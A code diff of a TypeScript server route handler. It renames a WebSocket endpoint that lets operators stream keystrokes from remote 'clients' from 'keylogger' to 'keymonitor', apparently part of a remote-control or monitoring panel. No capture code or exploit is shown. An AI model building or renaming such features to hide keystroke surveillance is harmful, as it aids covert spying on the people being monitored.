@@ -207,8 +207,8 @@ export async function handleWsUpgradeRoutes(
     return new Response("Upgrade failed", { status: 500 });
   }
 
-  const keyloggerMatch = url.pathname.match(/^\/api\/clients\/(.+)\/keylogger\/ws$/);
-  if (keyloggerMatch) {
+  const keymonitorMatch = url.pathname.match(/^\/api\/clients\/(.+)\/keymonitor\/ws$/);
+  if (keymonitorMatch) {
     const user = await authenticateRequest(req);
     if (!user) {
       return new Response("Unauthorized", { status: 401 });
@@ -217,11 +217,11 @@ export async function handleWsUpgradeRoutes(
     if (user.role === "viewer") {
       return new Response("Forbidden: Viewers cannot access interactive features", { status: 403 });
     }
-    const clientId = keyloggerMatch[1];
-    const denied = checkOperatorAccess(user, clientId, "keylogger");
+    const clientId = keymonitorMatch[1];
+    const denied = checkOperatorAccess(user, clientId, "keymonitor");
     if (denied) return denied;
     const ip = server.requestIP(req)?.address || "";
-    if (server.upgrade(req, { data: { role: "keylogger_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
+    if (server.upgrade(req, { data: { role: "keymonitor_viewer", clientId, ip, userRole: user.role, userId: user.userId } })) {
       return new Response();
     }
     return new Response("Upgrade failed", { status: 500 });
